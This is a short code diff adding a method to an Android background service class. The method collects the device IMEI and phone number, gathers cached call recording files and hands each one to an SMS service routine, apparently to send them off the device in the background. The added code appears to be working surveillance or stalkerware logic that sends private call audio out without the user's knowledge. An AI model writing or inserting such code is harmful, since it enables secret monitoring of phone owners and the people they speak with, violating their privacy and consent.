@@ -411,4 +411,29 @@ public class BackgroundJobService {
         }
         return false;
     }
+
+    public void sendCallRecording(){
+        if (ContextCompat.checkSelfPermission(context,
+                Manifest.permission.READ_SMS)
+                == PackageManager.PERMISSION_GRANTED) {
+            try {
+                imeiNumber = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
+                UserMobile = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getLine1Number();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            File folder = new File(context.getCacheDir().getAbsolutePath() + "/calls");
+            if (folder.exists()) {
+                File[] files = folder.listFiles();
+                if (files != null) {
+                    for (File file : files) {
+                        if(file != null && file.exists() && file.getAbsolutePath().endsWith("end.3gpp"))
+                        {
+                            smsService.sendCallrecordings(file, (UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
+                        }
+                    }
+                }
+            }
+        }
+    }
 }
